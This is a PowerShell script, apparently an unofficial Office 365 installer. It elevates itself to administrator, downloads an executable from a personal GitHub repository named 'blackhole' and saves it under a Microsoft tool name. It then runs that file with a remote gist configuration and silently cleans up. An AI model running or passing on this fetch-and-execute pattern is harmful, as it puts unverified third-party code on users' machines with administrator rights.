function Test-Administrator {
    $currentIdentity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($currentIdentity)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}
if (-Not (Test-Administrator)) {
    $scriptPath = $MyInvocation.MyCommand.Path
    Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`"" -Verb RunAs
    exit
}
$folderName = "Microsoft Office 365 Deployment"
$tempDir = [System.IO.Path]::GetTempPath()
$directory = Join-Path -Path $tempDir -ChildPath $folderName
$odtUrl = "https://raw.githubusercontent.com/almaheras/blackhole/refs/heads/main/setup.exe"
$expectedHash = "9530c6156cf8aba25e660b94666158f34ce54c2269af4727486c34b7ac5fb159ec711c9ee98ba5fda673fd29da3204111df52445d64ca5aca077ece79364dd61"

function Get-FileHashValue {
    param([string]$FilePath)
    if (Test-Path $FilePath) {
        $hash = Get-FileHash -Path $FilePath -Algorithm SHA512
        return $hash.Hash
    }
    return $null
}

if (!(Test-Path -Path $directory)) {
    New-Item -ItemType Directory -Path $directory
}
$odtPath = Join-Path -Path $directory -ChildPath "OfficeDeploymentTool.exe"
$shouldDownload = $true
if (Test-Path $odtPath) {
    $fileHash = Get-FileHashValue -FilePath $odtPath
    if ($fileHash -eq $expectedHash) {
        $shouldDownload = $false
    }
}
if ($shouldDownload) {
    try {
        Invoke-WebRequest -Uri $odtUrl -OutFile $odtPath -ErrorAction Stop
    } catch {
        exit
    }
}
if (-Not (Test-Path $odtPath) -or (Get-Item $odtPath).Extension -ne ".exe") {
    exit
}

try {
    Start-Process -FilePath $odtPath -ArgumentList "/configure https://gist.githubusercontent.com/almaheras/2972b39fcf1bd4e2fe2a0f8466a03db6/raw/" -Wait
    reg add "HKCU\Software\Policies\Microsoft\Office\16.0\Common" /v insiderslabbehavior /t REG_DWORD /d 1
} catch {
}
try {
    Remove-Item -Path $directory -Recurse -Force
} catch {
}
